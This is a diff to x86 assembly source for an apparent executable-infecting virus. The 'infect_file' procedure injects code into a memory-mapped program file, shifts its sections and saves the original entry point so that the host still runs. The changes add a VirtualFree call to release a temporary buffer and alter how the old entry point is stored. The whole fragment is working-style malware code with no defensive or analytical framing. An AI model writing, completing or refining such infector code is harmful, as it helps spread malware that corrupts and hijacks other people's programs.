@@ -7,7 +7,7 @@ include	utils.asm
 
 ; Parse and modify the executable mapped in memory to inject our code.
 ; ebx = delta offset
-infect_file PROC NEAR fileptr:DWORD, virtualalloc_addr:DWORD
+infect_file PROC NEAR fileptr:DWORD, virtualalloc_addr:DWORD, virtualfree_addr:DWORD
 
 LOCAL	lastsec_ptrtorawdata:DWORD
 LOCAL	lastsec_sizeofrawdata:DWORD
@@ -149,7 +149,10 @@ LOCAL	tmpbuf:DWORD
 	mov		esi, tmpbuf
 	call	my_memcpy					; copy sections back to mapped file.
 
-	; TODO: free tmpbuf
+	push	08000h
+	push	0
+	push	tmpbuf
+	call	virtualfree_addr
 
 ; --------------------------------------> Update all section headers for new sections offsets in file, ie add filealignment to their offset.
 
@@ -270,7 +273,6 @@ dont_move_sections:
 	mov		ecx, fileptr
 	add		ecx, pointertorawdata
 	mov		edx, oldentrypoint
-	add		edx, imagebase
 	mov		[ecx], edx					; Wrote oldentrypoint to new section.
 
 	popad
